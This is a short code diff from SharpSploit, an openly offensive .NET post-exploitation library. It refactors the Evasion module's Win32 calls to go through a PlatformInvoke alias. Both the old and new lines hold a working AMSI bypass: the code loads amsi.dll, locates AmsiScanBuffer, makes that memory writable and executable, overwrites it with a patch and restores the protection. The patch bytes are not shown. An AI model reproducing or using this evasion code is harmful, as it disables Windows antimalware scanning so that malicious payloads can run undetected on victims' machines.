@@ -6,7 +6,7 @@ using System;
 using System.Runtime.InteropServices;
 
 using SharpSploit.Misc;
-using SharpSploit.Execution;
+using PInvoke = SharpSploit.Execution.PlatformInvoke;
 
 namespace SharpSploit.Evasion
 {
@@ -51,12 +51,12 @@ namespace SharpSploit.Evasion
 
             try
             {
-                var library = Win32.Kernel32.LoadLibrary("amsi.dll");
-                var address = Win32.Kernel32.GetProcAddress(library, "AmsiScanBuffer");
+                var library = PInvoke.Win32.Kernel32.LoadLibrary("amsi.dll");
+                var address = PInvoke.Win32.Kernel32.GetProcAddress(library, "AmsiScanBuffer");
                 uint oldProtect;
-                Win32.Kernel32.VirtualProtect(address, (UIntPtr)patch.Length, 0x40, out oldProtect);
+                PInvoke.Win32.Kernel32.VirtualProtect(address, (UIntPtr)patch.Length, 0x40, out oldProtect);
                 Marshal.Copy(patch, 0, address, patch.Length);
-                Win32.Kernel32.VirtualProtect(address, (UIntPtr)patch.Length, oldProtect, out oldProtect);
+                PInvoke.Win32.Kernel32.VirtualProtect(address, (UIntPtr)patch.Length, oldProtect, out oldProtect);
                 return true;
             }
             catch (Exception e)
